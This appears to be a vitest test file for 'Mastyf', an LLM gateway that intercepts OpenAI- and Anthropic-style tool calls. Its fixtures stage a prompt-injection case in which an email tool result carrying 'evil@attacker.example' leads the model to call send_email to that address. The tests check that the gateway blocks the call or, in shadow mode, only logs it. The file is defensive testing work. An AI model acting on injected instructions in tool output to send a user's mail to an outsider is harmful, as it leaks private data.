import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { startLlmGateway } from '../../src/llm-gateway/server.js';
import { Logger } from '../../src/utils/logger.js';

const EVIL = 'evil@attacker.example';
const openaiBody = (toolText: string, extra: object = {}) => ({
  model: 'm',
  messages: [
    { role: 'user', content: 'summarize my mail' },
    { role: 'assistant', tool_calls: [{ id: 'c1', function: { name: 'get_email', arguments: '{}' } }] },
    { role: 'tool', tool_call_id: 'c1', content: toolText },
  ],
  ...extra,
});
const toolReply = { choices: [{ finish_reason: 'tool_calls', message: { content: null, tool_calls: [{ id: 'c2', function: { name: 'send_email', arguments: JSON.stringify({ to: EVIL }) } }] } }] };

let upstream: Server | undefined;
let gateway: Server | undefined;
let seen: { url?: string; auth?: string; body?: string };

async function listen(server: Server): Promise<number> {
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  return (server.address() as AddressInfo).port;
}

async function setup(handler: (res: import('node:http').ServerResponse) => void, mode: 'enforce' | 'shadow' = 'enforce') {
  seen = {};
  upstream = createServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      seen = { url: req.url, auth: req.headers.authorization, body };
      handler(res);
    });
  });
  const port = await listen(upstream);
  gateway = await startLlmGateway({ upstream: `http://127.0.0.1:${port}`, port: 0, mode });
  return `http://127.0.0.1:${(gateway.address() as AddressInfo).port}`;
}

const post = (url: string, body: unknown, path = '/v1/chat/completions') =>
  fetch(`${url}${path}`, { method: 'POST', headers: { 'content-type': 'application/json', authorization: 'Bearer sk-secret-key' }, body: JSON.stringify(body) });

const sse = (chunks: object[]) => chunks.map((c) => `data: ${JSON.stringify(c)}\n\n`).join('') + 'data: [DONE]\n\n';

afterEach(async () => {
  vi.restoreAllMocks();
  await new Promise((r) => (gateway ? gateway.close(r) : r(null)));
  await new Promise((r) => (upstream ? upstream.close(r) : r(null)));
  gateway = upstream = undefined;
});

describe('LLM gateway', () => {
  it('passes an ordinary request through untouched, with the key', async () => {
    const url = await setup((res) => res.end(JSON.stringify({ choices: [{ message: { content: 'hi' } }] })));
    const out = await post(url, openaiBody('hello'));
    expect(await out.json()).toEqual({ choices: [{ message: { content: 'hi' } }] });
    expect(seen.url).toBe('/v1/chat/completions');
    expect(seen.auth).toBe('Bearer sk-secret-key');
    expect(JSON.parse(seen.body!)).toEqual(openaiBody('hello'));
  });

  it('replaces a tool call caused by a tool result', async () => {
    const url = await setup((res) => res.end(JSON.stringify(toolReply)));
    const out = (await (await post(url, openaiBody(`mail ${EVIL}`))).json()) as { choices: { finish_reason: string; message: { content: string; tool_calls?: unknown } }[] };
    expect(out.choices[0]!.finish_reason).toBe('stop');
    expect(out.choices[0]!.message.tool_calls).toBeUndefined();
    expect(out.choices[0]!.message.content).toContain('Mastyf blocked');
  });

  it('only logs in shadow mode', async () => {
    const url = await setup((res) => res.end(JSON.stringify(toolReply)), 'shadow');
    const out = await (await post(url, openaiBody(`mail ${EVIL}`))).json();
    expect(out).toEqual(toolReply);
  });

  it('returns upstream errors intact', async () => {
    const url = await setup((res) => {
      res.statusCode = 429;
      res.end('{"error":"slow down"}');
    });
    const out = await post(url, openaiBody('x'));
    expect(out.status).toBe(429);
    expect(await out.text()).toBe('{"error":"slow down"}');
  });

  it('answers 502 when the upstream cannot be reached, without details', async () => {
    gateway = await startLlmGateway({ upstream: 'http://127.0.0.1:9', port: 0, mode: 'enforce' });
    const url = `http://127.0.0.1:${(gateway.address() as AddressInfo).port}`;
    const out = await post(url, openaiBody('x'));
    expect(out.status).toBe(502);
    expect(await out.text()).not.toContain('127.0.0.1');
  });

  it('never logs the key', async () => {
    const lines: string[] = [];
    for (const level of ['info', 'warn', 'error', 'debug'] as const) {
      vi.spyOn(Logger, level).mockImplementation((...args: unknown[]) => {
        lines.push(args.join(' '));
      });
    }
    const url = await setup((res) => res.end(JSON.stringify(toolReply)));
    await post(url, openaiBody(`mail ${EVIL}`));
    expect(lines.join('\n')).not.toContain('sk-secret-key');
  });

  it('streams text straight through', async () => {
    const chunks = [{ choices: [{ delta: { content: 'hel' } }] }, { choices: [{ delta: { content: 'lo' }, finish_reason: 'stop' }] }];
    const url = await setup((res) => {
      res.setHeader('content-type', 'text/event-stream');
      res.end(sse(chunks));
    });
    const out = await post(url, openaiBody('x', { stream: true }));
    expect(await out.text()).toBe(sse(chunks));
  });

  it('holds a streamed tool call until it is whole, and replaces it if blocked', async () => {
    const chunks = [
      { choices: [{ delta: { content: 'ok ' } }] },
      { choices: [{ delta: { tool_calls: [{ index: 0, id: 'c2', function: { name: 'send_email', arguments: '{"to":"evil@' } }] } }] },
      { choices: [{ delta: { tool_calls: [{ index: 0, function: { arguments: 'attacker.example"}' } }] } }] },
      { choices: [{ delta: {}, finish_reason: 'tool_calls' }] },
    ];
    const url = await setup((res) => {
      res.setHeader('content-type', 'text/event-stream');
      res.end(sse(chunks));
    });
    const text = await (await post(url, openaiBody(`mail ${EVIL}`, { stream: true }))).text();
    expect(text).toContain('"content":"ok "');
    expect(text).not.toContain('tool_calls');
    expect(text).toContain('Mastyf blocked');
    expect(text).toContain('"finish_reason":"stop"');
    expect(text.trim().endsWith('data: [DONE]')).toBe(true);
  });

  it('releases a streamed tool call that is allowed, unchanged', async () => {
    const chunks = [
      { choices: [{ delta: { tool_calls: [{ index: 0, id: 'c2', function: { name: 'send_email', arguments: '{"to":"bob@ok.example"}' } }] } }] },
      { choices: [{ delta: {}, finish_reason: 'tool_calls' }] },
    ];
    const url = await setup((res) => {
      res.setHeader('content-type', 'text/event-stream');
      res.end(sse(chunks));
    });
    expect(await (await post(url, openaiBody('hello', { stream: true }))).text()).toBe(sse(chunks));
  });

  it('holds and replaces a streamed Anthropic tool call', async () => {
    const events = [
      ['message_start', { type: 'message_start', message: { id: 'm' } }],
      ['content_block_start', { type: 'content_block_start', index: 0, content_block: { type: 'tool_use', id: 't', name: 'send_email', input: {} } }],
      ['content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'input_json_delta', partial_json: `{"to":"${EVIL}"}` } }],
      ['content_block_stop', { type: 'content_block_stop', index: 0 }],
      ['message_delta', { type: 'message_delta', delta: { stop_reason: 'tool_use' } }],
      ['message_stop', { type: 'message_stop' }],
    ] as const;
    const url = await setup((res) => {
      res.setHeader('content-type', 'text/event-stream');
      res.end(events.map(([e, d]) => `event: ${e}\ndata: ${JSON.stringify(d)}\n\n`).join(''));
    });
    const body = {
      model: 'm',
      stream: true,
      messages: [
        { role: 'user', content: 'summarize' },
        { role: 'assistant', content: [{ type: 'tool_use', id: 't1', name: 'get_email', input: {} }] },
        { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: `mail ${EVIL}` }] },
      ],
    };
    const text = await (await post(url, body, '/v1/messages')).text();
    expect(text).not.toContain('tool_use');
    expect(text).toContain('Mastyf blocked');
    expect(text).toContain('"stop_reason":"end_turn"');
    expect(text).toContain('message_stop');
  });

  it('passes other endpoints through byte for byte', async () => {
    const bytes = Buffer.from([0, 255, 128, 10, 200]);
    const url = await setup((res) => {
      res.setHeader('content-type', 'audio/mpeg');
      res.end(bytes);
    });
    const out = await post(url, { input: 'hi' }, '/v1/audio/speech');
    expect(Buffer.from(await out.arrayBuffer()).equals(bytes)).toBe(true);
  });

  it('warns that it cannot judge the Responses API', async () => {
    const warn = vi.spyOn(Logger, 'warn').mockImplementation(() => undefined);
    const url = await setup((res) => res.end('{}'));
    await post(url, { input: 'hi' }, '/v1/responses');
    expect(warn.mock.calls.flat().join(' ')).toContain('/responses');
  });

  it('refuses a body over the size limit', async () => {
    const url = await setup((res) => res.end('{}'));
    const out = await post(url, { messages: [{ role: 'user', content: 'x'.repeat(33 * 1024 * 1024) }] });
    expect(out.status).toBe(413);
  });
});
